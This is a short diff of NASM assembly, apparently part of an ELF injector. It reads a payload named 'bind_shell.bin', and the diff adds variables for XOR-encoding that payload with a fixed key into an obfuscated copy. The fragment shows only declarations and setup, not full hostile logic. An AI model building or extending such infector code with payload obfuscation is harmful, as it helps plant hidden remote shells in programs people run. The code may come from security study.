@@ -2,6 +2,10 @@ section .data
 	vmagicnum db 0x7f, 0x45, 0x4c, 0x46
 	nomelf db "simple", 0
 	payload_name db "bind_shell.bin", 0
+
+	input_bin db "bind_shell.bin",0
+    output_bin db "bind_shell_xor.bin",0
+    xor_key equ 0x5A
 section .bss
 	elfheader resb 64
 
@@ -40,6 +44,9 @@ section .bss
 	payload_size resq 1
 	payload_buffer resb 4096
 	program_header_buff resb 56
+
+	buffer resb 4096
+	
 
 section .text
 
@@ -224,6 +231,7 @@ fin_recherche:
 	mov r12, rax			; R12 = offset de fin du fichier
 
 	mov rdi, [rsp + 32] 		; payload_name exemple binshell
+
 
 	mov rax, 2
 	;mov rdi, payload_name
